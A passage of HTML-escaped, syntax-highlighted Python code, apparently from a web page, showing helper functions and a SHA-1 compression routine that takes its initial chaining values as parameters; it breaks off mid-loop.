&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    newl &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;r &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;lt;&amp;amp;lt; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;n
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    newr &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;l &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;gt;&amp;amp;gt; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;32&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;-&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;n)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;return &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;newl &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;newr
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;def &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;add&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;l&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;):
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    ret &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;0
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;for &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;e &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;in &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;l:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        ret &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(ret &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;e) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;amp; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;top
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;return &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;ret
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;xrange &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;range
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;def &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;sha1_impl&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;msg&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;h0&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;h1&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;h2&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;h3&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;h4&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;):
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;for &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;j &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;in &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;xrange&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;int&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;len&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(msg) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;#x2F; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;64&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;))&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        chunk &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;msg[j &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;* &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;64&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: (j&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;1&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;* &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;64&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;]
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        w &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;{}
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;for &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;i &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;in &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;xrange&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;16&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;            word &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;chunk[i&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;*&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;4&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: (i&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;1&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;)&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;*&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;4&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;]
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;            (w[i],) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;struct.unpack(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;&amp;amp;gt;i&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, word)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;for &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;i &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;in &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;range&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;16&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;80&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;            w[i] &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;rotl((w[i&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;-&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;3&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;] &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;^ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;w[i&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;-&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;8&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;] &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;^ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;w[i&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;-&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;14&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;] &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;^ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;w[i&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;-&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;16&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;]) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;amp; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;top, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;1&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        a &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;h0
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        b &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;h1
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        c &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;h2
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        d &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;h3
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        e &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;h4
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;for &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;i &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;in &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;range&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;0&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;80&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;            &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;if &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;0 &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;lt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;i &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;lt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;19&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;                f &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(b &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;amp; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;c) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;| &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;((&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;~ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;b) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;amp; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;d)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;                k &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;0x5A827999
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;            &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;elif &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;20 &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;lt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;i &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;lt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;39&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;                f &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;b &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;^ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;c &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;^ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;d
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;                k &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;0x6ED9EBA1
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;            &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;elif &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;40 &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;lt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;i &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;lt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;59&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;                f &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(b &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;amp; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;c) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;| &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(b &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;amp; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;d) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;| &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(c &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;amp; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;d)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;                k &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;0x8F1BBCDC
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;            &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;elif &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;60 &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;lt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;i &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;lt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;79&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;                f &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;b &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;^ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;c &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;^ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;d
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;                k &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;0xCA62C1D6
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
